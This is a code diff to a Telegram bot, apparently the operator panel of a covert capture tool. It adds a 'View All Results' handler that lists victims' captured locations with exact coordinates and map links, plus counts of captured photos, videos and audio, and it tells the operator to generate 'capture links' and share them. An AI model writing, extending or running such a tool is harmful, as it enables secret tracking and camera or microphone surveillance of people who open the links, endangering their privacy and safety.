@@ -223,6 +223,81 @@ bot.on('text', async (ctx) => {
         return;
     }
     
+    // Handle View All Results button
+    if (buttonText === '📊 View All Results') {
+        await ctx.sendChatAction('typing');
+        
+        try {
+            const result = await api.getAllCapturedData(user.id);
+            
+            if (!result.success || !result.data || result.data.length === 0) {
+                await ctx.reply('📭 No captured data yet.\n\nUse the menu to generate capture links and share them.');
+                return;
+            }
+            
+            const data = result.data;
+            
+            // Categorize data
+            const locations = data.filter(d => d.media_type === 'location');
+            const photos = data.filter(d => d.media_type === 'photo');
+            const videos = data.filter(d => d.media_type === 'video');
+            const audios = data.filter(d => d.media_type === 'audio');
+            
+            // Summary message
+            let msg = `📊 *ALL CAPTURED DATA*\n\n`;
+            msg += `📍 Locations: ${locations.length}\n`;
+            msg += `📷 Photos: ${photos.length}\n`;
+            msg += `🎥 Videos: ${videos.length}\n`;
+            msg += `🎤 Audio: ${audios.length}\n`;
+            msg += `\n━━━━━━━━━━━━━━━━━━\n`;
+            
+            await ctx.reply(msg, { parse_mode: 'Markdown' });
+            
+            // Show latest 5 locations with details
+            if (locations.length > 0) {
+                await ctx.reply(`📍 *LOCATIONS (Latest ${Math.min(5, locations.length)})*`, { parse_mode: 'Markdown' });
+                
+                const recentLocations = locations.slice(0, 5);
+                for (let i = 0; i < recentLocations.length; i++) {
+                    const loc = recentLocations[i];
+                    const metadata = typeof loc.metadata === 'string' ? JSON.parse(loc.metadata) : loc.metadata;
+                    
+                    let locMsg = `📍 *Location ${i + 1}*\n`;
+                    locMsg += `🕐 ${new Date(loc.created_at).toLocaleString()}\n\n`;
+                    
+                    if (metadata.latitude && metadata.longitude) {
+                        locMsg += `🎯 Lat: \`${metadata.latitude}\`\n`;
+                        locMsg += `🎯 Lng: \`${metadata.longitude}\`\n`;
+                        if (metadata.accuracy) locMsg += `📏 Accuracy: ${metadata.accuracy}m\n`;
+                        locMsg += `\n[📍 Open in Google Maps](https://www.google.com/maps?q=${metadata.latitude},${metadata.longitude})`;
+                    }
+                    
+                    await ctx.reply(locMsg, { parse_mode: 'Markdown', disable_web_page_preview: true });
+                }
+            }
+            
+            // Show photos count and notify about files
+            if (photos.length > 0) {
+                await ctx.reply(`📷 *PHOTOS*\n\n${photos.length} photo(s) captured.\nFiles are stored on the server.`, { parse_mode: 'Markdown' });
+            }
+            
+            // Show videos count
+            if (videos.length > 0) {
+                await ctx.reply(`🎥 *VIDEOS*\n\n${videos.length} video(s) captured.\nFiles are stored on the server.`, { parse_mode: 'Markdown' });
+            }
+            
+            // Show audio count
+            if (audios.length > 0) {
+                await ctx.reply(`🎤 *AUDIO*\n\n${audios.length} audio recording(s) captured.\nFiles are stored on the server.`, { parse_mode: 'Markdown' });
+            }
+            
+        } catch (error) {
+            logger.error('Failed to get all results', { error: error.message });
+            await ctx.reply('❌ Failed to fetch results: ' + error.message);
+        }
+        return;
+    }
+    
     // Handle Request Access button
     if (buttonText === '🔑 Request Access') {
         try {
